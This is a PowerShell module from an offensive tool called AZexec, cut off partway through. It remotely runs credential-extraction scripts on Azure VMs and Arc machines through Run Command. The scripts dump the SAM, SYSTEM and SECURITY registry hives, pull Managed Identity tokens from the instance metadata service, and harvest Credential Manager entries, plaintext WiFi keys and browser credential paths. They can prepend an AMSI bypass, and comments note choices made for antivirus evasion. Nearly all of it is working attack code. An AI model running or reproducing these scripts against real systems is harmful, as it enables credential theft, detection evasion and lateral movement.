# AZexec - Credential Extraction Functions
# Azure equivalent of NetExec's --sam credential dumping functionality
# Supports SAM extraction, Managed Identity tokens, and DPAPI secrets

# ============================================
# OPSEC WARNING FUNCTION
# ============================================
function Show-CredentialOPSECWarning {
    Write-ColorOutput -Message "`n[!] ========================================" -Color "Red"
    Write-ColorOutput -Message "[!] OPSEC WARNING: Credential Extraction Detection Risk" -Color "Red"
    Write-ColorOutput -Message "[!] ========================================" -Color "Red"
    Write-ColorOutput -Message "[!] This operation may trigger:" -Color "Yellow"
    Write-ColorOutput -Message "    - MDE: 'Credential dumping activity detected'" -Color "White"
    Write-ColorOutput -Message "    - Azure Security Center: 'Suspicious PowerShell execution'" -Color "White"
    Write-ColorOutput -Message "    - Event ID 4656/4663: SAM registry key access" -Color "White"
    Write-ColorOutput -Message "    - Event ID 4688: reg.exe execution" -Color "White"
    Write-ColorOutput -Message "[*] Use -AmsiBypass for evasion (same as exec command)`n" -Color "Cyan"
}

# ============================================
# SCRIPT GENERATION FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Generate PowerShell script for SAM/SYSTEM/SECURITY registry hive extraction.
.DESCRIPTION
    Creates a PowerShell script that exports registry hives and base64 encodes them
    for transfer via Run Command output. Uses reg.exe for better AV evasion.
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-SAMExtractionScript {
    return @'
$tempDir = "$env:TEMP\azx_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
try {
    # Export hives using reg.exe (better AV evasion than PowerShell)
    reg.exe save HKLM\SAM "$tempDir\SAM" /y 2>&1 | Out-Null
    reg.exe save HKLM\SYSTEM "$tempDir\SYSTEM" /y 2>&1 | Out-Null
    reg.exe save HKLM\SECURITY "$tempDir\SECURITY" /y 2>&1 | Out-Null

    # Verify exports succeeded
    if (-not (Test-Path "$tempDir\SAM") -or -not (Test-Path "$tempDir\SYSTEM")) {
        Write-Output "---ERROR---"
        Write-Output "Failed to export registry hives - requires SYSTEM privileges"
        return
    }

    # Base64 encode for transfer
    $sam = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SAM"))
    $system = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SYSTEM"))
    $security = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SECURITY"))

    # Structured output with delimiters
    Write-Output "---SAM---"
    Write-Output $sam
    Write-Output "---SYSTEM---"
    Write-Output $system
    Write-Output "---SECURITY---"
    Write-Output $security
    Write-Output "---SUCCESS---"
} catch {
    Write-Output "---ERROR---"
    Write-Output $_.Exception.Message
} finally {
    # Cleanup
    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}
'@
}

<#
.SYNOPSIS
    Generate PowerShell script for IMDS Managed Identity token extraction.
.DESCRIPTION
    Creates a PowerShell script that queries the Azure Instance Metadata Service
    to extract Managed Identity tokens for various Azure resources.
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-TokenExtractionScript {
    return @'
$imdsUrl = "http://169.254.169.254/metadata/identity/oauth2/token"
$headers = @{"Metadata" = "true"}
$resources = @(
    "https://management.azure.com/",
    "https://graph.microsoft.com/",
    "https://vault.azure.net/",
    "https://storage.azure.com/",
    "https://database.windows.net/",
    "https://servicebus.azure.net/"
)
$tokens = @()
$hasIdentity = $false

foreach ($r in $resources) {
    try {
        $uri = "${imdsUrl}?api-version=2018-02-01&resource=$r"
        $resp = Invoke-RestMethod -Uri $uri -Headers $headers -TimeoutSec 5 -ErrorAction Stop
        $hasIdentity = $true
        $tokens += [PSCustomObject]@{
            Resource = $r
            Token = $resp.access_token
            TokenType = $resp.token_type
            ExpiresIn = $resp.expires_in
            ExpiresOn = $resp.expires_on
            ClientId = $resp.client_id
        }
    } catch {
        # Silently skip resources that don't have tokens
    }
}

Write-Output "---TOKENS---"
if ($tokens.Count -gt 0) {
    Write-Output ($tokens | ConvertTo-Json -Compress -Depth 5)
    Write-Output "---SUCCESS---"
} elseif (-not $hasIdentity) {
    Write-Output "NO_MANAGED_IDENTITY"
    Write-Output "---SUCCESS---"
} else {
    Write-Output "NO_TOKENS"
    Write-Output "---SUCCESS---"
}
'@
}

<#
.SYNOPSIS
    Generate PowerShell script for DPAPI secrets extraction.
.DESCRIPTION
    Creates a PowerShell script that extracts Windows Credential Manager entries,
    WiFi profiles with PSKs, and identifies browser credential paths.
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-DPAPIExtractionScript {
    return @'
$results = @{
    CredentialManager = @()
    WiFiProfiles = @()
    BrowserPaths = @()
    Hostname = $env:COMPUTERNAME
    Username = $env:USERNAME
}

# Windows Credential Manager (cmdkey)
try {
    $vaultOutput = cmdkey /list 2>&1 | Out-String
    if ($vaultOutput -match "Target:") {
        # Parse cmdkey output into structured data
        $currentCred = $null
        foreach ($line in ($vaultOutput -split "`n")) {
            if ($line -match "^\s*Target:\s*(.+)$") {
                if ($currentCred) { $results.CredentialManager += $currentCred }
                $currentCred = @{ Target = $Matches[1].Trim(); Type = ""; User = "" }
            }
            elseif ($line -match "^\s*Type:\s*(.+)$" -and $currentCred) {
                $currentCred.Type = $Matches[1].Trim()
            }
            elseif ($line -match "^\s*User:\s*(.+)$" -and $currentCred) {
                $currentCred.User = $Matches[1].Trim()
            }
        }
        if ($currentCred) { $results.CredentialManager += $currentCred }
    }
} catch {}

# WiFi Profiles with PSK (plaintext keys)
try {
    $profilesRaw = netsh wlan show profiles 2>&1
    if ($profilesRaw -notmatch "is not running") {
        $profiles = $profilesRaw | Select-String "All User Profile\s*:\s*(.+)" | ForEach-Object {
            $_.Matches.Groups[1].Value.Trim()
        }
        foreach ($p in $profiles) {
            if ([string]::IsNullOrWhiteSpace($p)) { continue }
            $detail = netsh wlan show profile name="$p" key=clear 2>&1 | Out-String
            $keyMatch = [regex]::Match($detail, "Key Content\s*:\s*(.+)")
            $authMatch = [regex]::Match($detail, "Authentication\s*:\s*(.+)")
            $cipherMatch = [regex]::Match($detail, "Cipher\s*:\s*(.+)")

            $wifiEntry = @{
                SSID = $p
                Key = if ($keyMatch.Success) { $keyMatch.Groups[1].Value.Trim() } else { "" }
                Authentication = if ($authMatch.Success) { $authMatch.Groups[1].Value.Trim() } else { "" }
                Cipher = if ($cipherMatch.Success) { $cipherMatch.Groups[1].Value.Trim() } else { "" }
            }
            if ($wifiEntry.Key) {
                $results.WiFiProfiles += $wifiEntry
            }
        }
    }
} catch {}

# Browser credential paths (for offline extraction)
$browserPaths = @(
    @{ Browser = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" }
    @{ Browser = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" }
    @{ Browser = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" }
    @{ Browser = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies" }
    @{ Browser = "Firefox"; Path = "$env:APPDATA\Mozilla\Firefox\Profiles" }
    @{ Browser = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data" }
)

foreach ($bp in $browserPaths) {
    if (Test-Path $bp.Path) {
        $results.BrowserPaths += @{
            Browser = $bp.Browser
            Path = $bp.Path
            Exists = $true
        }
    }
}

Write-Output "---DPAPI---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

# ============================================
# OUTPUT PARSING FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Parse SAM extraction output and decode registry hives.
.DESCRIPTION
    Parses the delimited output from SAM extraction script,
    decodes base64 hives, and attempts to extract password hashes.
.PARAMETER Output
    Raw output from the SAM extraction script.
.PARAMETER TempDir
    Temporary directory to save decoded hives.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Parse-SAMOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output,

        [Parameter(Mandatory = $false)]
        [string]$TempDir = "$env:TEMP\azx_sam_$(Get-Random)"
    )

    $result = @{
        Success = $false
        Hashes = @()
        SAMPath = $null
        SYSTEMPath = $null
        SECURITYPath = $null
        Error = $null
        RawHashes = ""
    }

    # Check for errors
    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    # Check for success
    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "Extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        # Create temp directory for hive files
        New-Item -ItemType Directory -Path $TempDir -Force | Out-Null

        # Extract base64 encoded hives
        if ($Output -match "---SAM---\s*([A-Za-z0-9+/=]+)\s*---SYSTEM---") {
            $samB64 = $Matches[1].Trim()
            $samBytes = [Convert]::FromBase64String($samB64)
            $result.SAMPath = Join-Path $TempDir "SAM"
            [IO.File]::WriteAllBytes($result.SAMPath, $samBytes)
        }

        if ($Output -match "---SYSTEM---\s*([A-Za-z0-9+/=]+)\s*---SECURITY---") {
            $systemB64 = $Matches[1].Trim()
            $systemBytes = [Convert]::FromBase64String($systemB64)
            $result.SYSTEMPath = Join-Path $TempDir "SYSTEM"
            [IO.File]::WriteAllBytes($result.SYSTEMPath, $systemBytes)
        }

        if ($Output -match "---SECURITY---\s*([A-Za-z0-9+/=]+)\s*---SUCCESS---") {
            $securityB64 = $Matches[1].Trim()
            $securityBytes = [Convert]::FromBase64String($securityB64)
            $result.SECURITYPath = Join-Path $TempDir "SECURITY"
            [IO.File]::WriteAllBytes($result.SECURITYPath, $securityBytes)
        }

        # Try to parse hashes using secretsdump if available
        $secretsdumpPath = Test-SecretsdumpAvailable
        if ($secretsdumpPath -and $result.SAMPath -and $result.SYSTEMPath) {
            $hashOutput = & python $secretsdumpPath -sam $result.SAMPath -system $result.SYSTEMPath LOCAL 2>&1
            $result.RawHashes = $hashOutput | Out-String

            # Parse hash output
            foreach ($line in $hashOutput) {
                if ($line -match "^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::$") {
                    $result.Hashes += [PSCustomObject]@{
                        Username = $Matches[1]
                        RID = $Matches[2]
                        LMHash = $Matches[3]
                        NTHash = $Matches[4]
                        HashLine = $line
                    }
                }
            }
            $result.Success = $true
        } else {
            # Fallback: Embedded parsing (basic bootkey + SAM decryption)
            $bootkey = Get-BootkeyFromSystem -SystemPath $result.SYSTEMPath
            if ($bootkey) {
                $hashes = Get-SAMHashesWithBootkey -SAMPath $result.SAMPath -Bootkey $bootkey
                $result.Hashes = $hashes
                $result.Success = ($hashes.Count -gt 0)

                # Build raw hash output for display
                foreach ($h in $hashes) {
                    $result.RawHashes += "$($h.Username):$($h.RID):$($h.LMHash):$($h.NTHash):::`n"
                }
            } else {
                $result.Error = "Could not extract bootkey from SYSTEM hive"
                # Still mark partial success - hives were extracted
                $result.Success = $true
            }
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Check if secretsdump.py is available on the system.
.OUTPUTS
    Path to secretsdump.py if found, $null otherwise.
#>
function Test-SecretsdumpAvailable {
    $searchPaths = @(
        (Get-Command "secretsdump.py" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source),
        "$env:USERPROFILE\.local\bin\secretsdump.py",
        "C:\Tools\impacket\secretsdump.py",
        "C:\Python*\Scripts\secretsdump.py",
        "/usr/local/bin/secretsdump.py",
        "/usr/bin/secretsdump.py"
    )

    foreach ($p in $searchPaths) {
        if ($p -and (Test-Path $p -ErrorAction SilentlyContinue)) {
            return $p
        }
    }
    return $null
}

<#
.SYNOPSIS
    Extract bootkey from SYSTEM registry hive.
.DESCRIPTION
    Reads the LSA key components from the SYSTEM hive and derives the bootkey.
.PARAMETER SystemPath
    Path to the SYSTEM hive file.
.OUTPUTS
    Bootkey as byte array, or $null on failure.
#>
function Get-BootkeyFromSystem {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SystemPath
    )

    try {
        # Load the SYSTEM hive
        $hiveBytes = [IO.File]::ReadAllBytes($SystemPath)

        # The bootkey is derived from the class names of 4 registry keys under
        # HKLM\SYSTEM\CurrentControlSet\Control\Lsa
        # Keys: JD, Skew1, GBG, Data
        # The class names are scrambled according to a specific permutation

        # This is a simplified implementation - for production use,
        # consider using a proper registry hive parser library

        # Search for the LSA key pattern in the hive
        $lsaPattern = [System.Text.Encoding]::Unicode.GetBytes("Lsa")
        $jdPattern = [System.Text.Encoding]::Unicode.GetBytes("JD")
        $skewPattern = [System.Text.Encoding]::Unicode.GetBytes("Skew1")
        $gbgPattern = [System.Text.Encoding]::Unicode.GetBytes("GBG")
        $dataPattern = [System.Text.Encoding]::Unicode.GetBytes("Data")

        # For a robust implementation, we'd need a full registry hive parser
        # Return null to trigger the "hives extracted, use secretsdump" message
        return $null

    } catch {
        return $null
    }
}

<#
.SYNOPSIS
    Extract SAM hashes using the bootkey.
.PARAMETER SAMPath
    Path to the SAM hive file.
.PARAMETER Bootkey
    Bootkey byte array from SYSTEM hive.
.OUTPUTS
    Array of hash objects.
#>
function Get-SAMHashesWithBootkey {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SAMPath,

        [Parameter(Mandatory = $true)]
        [byte[]]$Bootkey
    )

    # Placeholder - full implementation would decrypt SAM entries
    # For now, return empty array and recommend secretsdump
    return @()
}

<#
.SYNOPSIS
    Parse token extraction output.
.PARAMETER Output
    Raw output from the token extraction script.
.OUTPUTS
    PSCustomObject with token results.
#>
function Parse-TokenOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Tokens = @()
        HasManagedIdentity = $false
        Error = $null
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "Token extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    if ($Output -match "---TOKENS---\s*(.+)\s*---SUCCESS---") {
        $tokenData = $Matches[1].Trim()

        if ($tokenData -eq "NO_MANAGED_IDENTITY") {
            $result.Success = $true
            $result.HasManagedIdentity = $false
        } elseif ($tokenData -eq "NO_TOKENS") {
            $result.Success = $true
            $result.HasManagedIdentity = $true
        } else {
            try {
                $tokens = $tokenData | ConvertFrom-Json
                if ($tokens -is [Array]) {
                    $result.Tokens = $tokens
                } else {
                    $result.Tokens = @($tokens)
                }
                $result.Success = $true
                $result.HasManagedIdentity = $true
            } catch {
                $result.Error = "Failed to parse token JSON: $($_.Exception.Message)"
            }
        }
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Parse DPAPI extraction output.
.PARAMETER Output
    Raw output from the DPAPI extraction script.
.OUTPUTS
    PSCustomObject with DPAPI results.
#>
function Parse-DPAPIOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        CredentialManager = @()
        WiFiProfiles = @()
        BrowserPaths = @()
        Hostname = ""
        Username = ""
        Error = $null
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "DPAPI extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    if ($Output -match "---DPAPI---\s*(.+)\s*---SUCCESS---") {
        $dpapiData = $Matches[1].Trim()

        try {
            $parsed = $dpapiData | ConvertFrom-Json
            $result.CredentialManager = if ($parsed.CredentialManager) { $parsed.CredentialManager } else { @() }
            $result.WiFiProfiles = if ($parsed.WiFiProfiles) { $parsed.WiFiProfiles } else { @() }
            $result.BrowserPaths = if ($parsed.BrowserPaths) { $parsed.BrowserPaths } else { @() }
            $result.Hostname = if ($parsed.Hostname) { $parsed.Hostname } else { "" }
            $result.Username = if ($parsed.Username) { $parsed.Username } else { "" }
            $result.Success = $true
        } catch {
            $result.Error = "Failed to parse DPAPI JSON: $($_.Exception.Message)"
        }
    }

    return [PSCustomObject]$result
}

# ============================================
# OUTPUT FORMATTING FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Format credential extraction results in NetExec style.
.PARAMETER TargetName
    Name of the target (VM/Device).
.PARAMETER OSType
    Operating system type.
.PARAMETER ExtractType
    Type of extraction (SAM, TOKEN, DPAPI).
.PARAMETER Data
    Extraction data to format.
#>
function Format-CredentialOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetName,

        [Parameter(Mandatory = $false)]
        [string]$OSType = "Windows",

        [Parameter(Mandatory = $true)]
        [ValidateSet("SAM", "TOKEN", "DPAPI")]
        [string]$ExtractType,

        [Parameter(Mandatory = $true)]
        $Data
    )

    $prefix = "AZR".PadRight(7)
    $target = $TargetName.PadRight(20)
    $port = "443".PadRight(6)
    $os = $OSType.PadRight(12)

    switch ($ExtractType) {
        "SAM" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(SAM_DUMP)" -Color "Cyan"

            if ($Data.Hashes -and $Data.Hashes.Count -gt 0) {
                foreach ($hash in $Data.Hashes) {
                    $hashLine = "$($hash.Username):$($hash.RID):$($hash.LMHash):$($hash.NTHash):::"
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}${hashLine}" -Color "Green"
                }
            } elseif ($Data.SAMPath -and $Data.SYSTEMPath) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Registry hives extracted - use secretsdump.py:" -Color "Yellow"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SAM:      $($Data.SAMPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SYSTEM:   $($Data.SYSTEMPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SECURITY: $($Data.SECURITYPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  Command: secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL" -Color "Cyan"
            } elseif ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}SAM extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "TOKEN" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(TOKEN_DUMP)" -Color "Cyan"

            if (-not $Data.HasManagedIdentity) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No Managed Identity configured" -Color "Yellow"
            } elseif ($Data.Tokens.Count -eq 0) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Managed Identity exists but no tokens obtained" -Color "Yellow"
            } else {
                foreach ($token in $Data.Tokens) {
                    $resource = $token.Resource -replace "https://", "" -replace "/", ""
                    $expires = if ($token.ExpiresIn) { "$($token.ExpiresIn)s" } else { "unknown" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}MI Token: ${resource} (expires: ${expires})" -Color "Green"

                    # Show truncated token for verification
                    if ($token.Token) {
                        $tokenPreview = $token.Token.Substring(0, [Math]::Min(50, $token.Token.Length)) + "..."
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}  Token: ${tokenPreview}" -Color "DarkGray"
                    }
                }
            }
        }

        "DPAPI" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(DPAPI_DUMP)" -Color "Cyan"

            # WiFi Profiles
            if ($Data.WiFiProfiles -and $Data.WiFiProfiles.Count -gt 0) {
                foreach ($wifi in $Data.WiFiProfiles) {
                    $ssid = $wifi.SSID
                    $key = $wifi.Key
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}WiFi: ${ssid} -> [PLAINTEXT] ${key}" -Color "Green"
                }
            }

            # Credential Manager
            if ($Data.CredentialManager -and $Data.CredentialManager.Count -gt 0) {
                foreach ($cred in $Data.CredentialManager) {
                    $credTarget = $cred.Target
                    $credUser = $cred.User
                    if ($credTarget -and $credUser) {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}CredMan: ${credTarget} -> ${credUser}" -Color "Yellow"
                    }
                }
            }

            # Browser Paths
            if ($Data.BrowserPaths -and $Data.BrowserPaths.Count -gt 0) {
                foreach ($browser in $Data.BrowserPaths) {
                    $browserName = $browser.Browser
                    $pathType = if ($browser.Path -match "Login Data") { "Login Data" } else { "Data" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}Browser: ${browserName} ${pathType} found (extract offline)" -Color "Yellow"
                }
            }

            # No findings
            if ((-not $Data.WiFiProfiles -or $Data.WiFiProfiles.Count -eq 0) -and
                (-not $Data.CredentialManager -or $Data.CredentialManager.Count -eq 0) -and
                (-not $Data.BrowserPaths -or $Data.BrowserPaths.Count -eq 0)) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No DPAPI secrets found" -Color "DarkGray"
            }
        }
    }
}

# ============================================
# SINGLE TARGET EXTRACTION FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Execute SAM extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-SAMExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "SAM"
        Success = $false
        Data = $null
        Error = $null
    }

    # SAM extraction only works on Windows
    if ($Target.OSType -ne "Windows") {
        $result.Error = "SAM extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        # Switch to correct subscription context
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-SAMExtractionScript

        # Add AMSI bypass if specified
        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        # Execute based on target type
        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop

            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-creds-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop

            $output = $arcResult.InstanceViewOutput

            # Cleanup
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue
        }

        # Clean up output
        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        # Parse results
        $tempDir = "$env:TEMP\azx_sam_$($Target.Name)_$(Get-Date -Format 'yyyyMMddHHmmss')"
        $parsed = Parse-SAMOutput -Output $output -TempDir $tempDir

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Execute token extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-TokenExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "TOKEN"
        Success = $false
        Data = $null
        Error = $null
    }

    try {
        # Switch to correct subscription context
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-TokenExtractionScript

        # Execute based on target type
        $output = ""
        $commandId = if ($Target.OSType -eq "Windows") { "RunPowerShellScript" } else { "RunShellScript" }

        # For Linux, convert PowerShell to bash curl commands
        if ($Target.OSType -ne "Windows") {
            $script = @'
#!/bin/bash
imds_url="http://169.254.169.254/metadata/identity/oauth2/token"
resources=(
    "https://management.azure.com/"
    "https://graph.microsoft.com/"
    "https://vault.azure.net/"
    "https://storage.azure.com/"
)
echo "---TOKENS---"
tokens="["
first=true
for r in "${resources[@]}"; do
    response=$(curl -s -H "Metadata:true" "${imds_url}?api-version=2018-02-01&resource=${r}" 2>/dev/null)
    if [[ $response == *"access_token"* ]]; then
        if [ "$first" = false ]; then tokens+=","; fi
        first=false
        token=$(echo $response | grep -oP '"access_token":"\K[^"]+')
        expires=$(echo $response | grep -oP '"expires_in":"\K[^"]+' || echo "3600")
        tokens+="{\"Resource\":\"${r}\",\"Token\":\"${token}\",\"ExpiresIn\":\"${expires}\"}"
    fi
done
tokens+="]"
if [ "$tokens" = "[]" ]; then
    echo "NO_MANAGED_IDENTITY"
else
    echo "$tokens"
fi
echo "---SUCCESS---"
'@
        }

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId $commandId `
                -ScriptString $script `
                -ErrorAction Stop

            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-token-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop

            $output = $arcResult.InstanceViewOutput

            # Cleanup
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue
        }

        # Clean up output
        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        # Parse results
        $parsed = Parse-TokenOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Execute DPAPI extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-DPAPIExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "DPAPI"
        Success = $false
        Data = $null
        Error = $null
    }

    # DPAPI extraction only works on Windows
    if ($Target.OSType -ne "Windows") {
        $result.Error = "DPAPI extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        # Switch to correct subscription context
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-DPAPIExtractionScript

        # Add AMSI bypass if specified
        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        # Execute based on target type
        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop

            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-dpapi-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop

            $output = $arcResult.InstanceViewOutput

            # Cleanup
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue
        }

        # Clean up output
        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        # Parse results
        $parsed = Parse-DPAPIOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# MAIN ORCHESTRATOR FUNCTION
# ============================================

<#
.SYNOPSIS
    Main credential extraction orchestrator (Azure equivalent of NetExec --sam).
.DESCRIPTION
    Coordinates credential extraction across Azure VMs and Arc devices.
    Supports SAM hash dumping, Managed Identity token extraction, and DPAPI secrets.
.PARAMETER VMName
    Target a specific Azure VM by name.
.PARAMETER AllVMs
    Target all Azure VMs.
.PARAMETER DeviceName
    Target a specific Arc device by name.
.PARAMETER AllDevices
    Target all Arc devices.
.PARAMETER ResourceGroup
